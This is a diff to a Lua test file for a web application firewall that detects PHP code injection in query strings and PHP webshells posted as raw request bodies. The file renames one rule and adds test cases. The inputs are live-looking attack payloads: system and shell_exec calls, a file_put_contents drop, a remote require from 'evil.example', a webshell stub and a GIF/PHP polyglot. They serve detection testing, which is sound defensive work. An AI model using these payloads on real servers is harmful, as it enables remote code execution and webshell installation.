@@ -1,5 +1,5 @@
 -- Tests for rule 332 (rule_php_code_args, WAF_RCE, logonly): PHP source in
--- the query string, and rule 416 (rule_php_raw_body_untyped,
+-- the query string, and rule 416 (rule_php_file_body,
 -- WAF_PHP_WEBSHELL_BODY, logonly): a PHP file posted as the raw body under a
 -- Content-Type no body scanner reads.
 --
@@ -73,7 +73,7 @@ local function clean(c, label)
 end
 
 check(waf.get_config().rule_php_code_args == "logonly", "332 ships logonly")
-check(waf.get_config().rule_php_raw_body_untyped == "logonly", "416 ships logonly")
+check(waf.get_config().rule_php_file_body == "logonly", "416 ships logonly")
 
 -- ── Rule 332 ────────────────────────────────────────────────────────────────
 set_only({ rule_php_code_args = "logonly" })
@@ -118,6 +118,11 @@ fires(req({ uri = "/", args = "+config-create+/" .. ue("<?=(@system(" .. chrs("i
 fires(req({ args = "c=" .. ue("$x = shell_exec('id');") }), "an assignment of a sink's result", A .. "ASSIGN", 332)
 fires(req({ args = "c=" .. "return+file_put_contents('a.php','x');" }), "`+` read as a space before return", A .. "RETURN", 332)
 fires(req({ args = "c=" .. ue("system /**/ ('id').'x'.'y'") }), "a /* */ comment before the paren", A .. "CONCAT", 332)
+fires(fabrik("if(1){return system('id');}"), "return after `{`", A .. "RETURN", 332)
+fires(fabrik("include $_GET['f'];"), "include without parens, a superglobal", A .. "SUPERGLOBAL", 332)
+fires(req({ args = "s=" .. ue("<?php require 'http://evil.example/x.txt'; ?>") }), "require 'url' without parens", A .. "OPEN", 332)
+fires(req({ args = "c=" .. ue("$a=1&&system('id')") }), "an encoded && stays in its parameter", A .. "ASSIGN", 332)
+fires(req({ args = "c=%2524x%253Dsystem(%2527id%2527)" }), "double-encoded (normalize decodes twice)", A .. "ASSIGN", 332)
 
 -- Negatives: what real sites send.
 clean(req({ uri = "/css/media.css", args = "v=" .. ue("<?php echo rand(00000, 99999); ?>") }),
@@ -134,6 +139,8 @@ clean(req({ args = "q=" .. ue("$executive = 'boss'") }), "a variable named like 
 clean(req({ args = "utm_source=newsletter&utm_campaign=system(1)&price=$100" }), "system(1) in a UTM value, $100")
 clean(req({ args = "s=" .. ue("operating system (linux)") .. "&tpl=" .. ue("'a'.'b'") }), "a sink in one parameter, code syntax in another")
 clean(req({ args = "q=exec(&price=" .. ue("$total=5") }), "exec( and an assignment in different parameters")
+clean(req({ args = "q=" .. ue("include files in php") }), "include as a word")
+clean(req({ args = "q=" .. ue("what to include? 'socks'") }), "include, then a quote not right after it")
 clean(req({ args = "" }), "no query")
 
 check(det.detect_php_code_args(nil) == nil, "332 nil")
@@ -144,8 +151,8 @@ set_only({ rule_php_code_args = "disabled" })
 clean(fabrik("$f=fopen('x.php','w');return 1;"), "332 disabled")
 
 -- ── Rule 416 ────────────────────────────────────────────────────────────────
-set_only({ rule_php_raw_body_untyped = "logonly" })
-local B = "WAF_PHP_WEBSHELL_BODY:UNTYPED_"
+set_only({ rule_php_file_body = "logonly" })
+local B = "WAF_PHP_WEBSHELL_BODY:BODY_IS_"
 local SHELL = "<?php\nsession_start();\n$server_info = [\n    'Disable Function:' => ini_get('disable_functions'),\n];\n"
 local function upload(ct, body)
   return req({ method = "POST", uri = "/up.php", args = "f=yavuzshell.php", ct = ct, body = body })
@@ -158,6 +165,12 @@ fires(upload("application/x-httpd-php", SHELL), "application/x-httpd-php", B .. 
 fires(upload("application/octet-stream", "\239\187\191  \n<?= `id` ?>"), "BOM and blanks, then <?=", B .. "PHP_FILE_OCTET", 416)
 fires(upload("image/gif", "GIF89a\n<?php system($_GET['c']); ?>"), "a GIF polyglot", B .. "GIF_POLYGLOT_OTHER", 416)
 fires(upload("application/octet-stream", "<?PHP echo 1;"), "upper-case opener", B .. "PHP_FILE_OCTET", 416)
+do
+  local c = upload("application/octet-stream", SHELL); c.method = "PUT"
+  fires(c, "PUT (php://input reads it too)", B .. "PHP_FILE_OCTET", 416)
+  c = upload("application/octet-stream", SHELL); c.method = "PATCH"
+  fires(c, "PATCH", B .. "PHP_FILE_OCTET", 416)
+end
 
 fires(upload("application/x-www-form-urlencoded", SHELL), "a PHP file relabelled as a form", B .. "PHP_FILE_FORM", 416)
 fires(upload("application/json", SHELL), "a PHP file relabelled as JSON", B .. "PHP_FILE_JSON", 416)
@@ -172,14 +185,14 @@ clean(upload("application/octet-stream", "hello <?php"), "a PHP tag not at the s
 clean(upload("image/gif", "GIF89a" .. string.rep("\0", 300) .. "<?php"), "a GIF tag past 256 bytes")
 clean(req({ method = "GET", uri = "/up.php", body = "" }), "GET")
 
-check(det.detect_php_raw_body_untyped(nil, {}) == nil, "416 nil")
-check(det.detect_php_raw_body_untyped("", {}) == nil, "416 empty")
+check(det.detect_php_file_body(nil, {}) == nil, "416 nil")
+check(det.detect_php_file_body("", {}) == nil, "416 empty")
 
-set_only({ rule_php_raw_body_untyped = "disabled" })
+set_only({ rule_php_file_body = "disabled" })
 clean(upload("application/octet-stream", SHELL), "416 disabled")
 
 if fails > 0 then
-  io.stderr:write(("cfm_waf php code args / untyped body tests: %d FAILED\n"):format(fails))
+  io.stderr:write(("cfm_waf php code args / PHP file body tests: %d FAILED\n"):format(fails))
   os.exit(1)
 end
-print("ok: cfm_waf PHP code in the query (rule 332) and untyped PHP body (rule 416)")
+print("ok: cfm_waf PHP code in the query (rule 332) and a PHP file as the body (rule 416)")
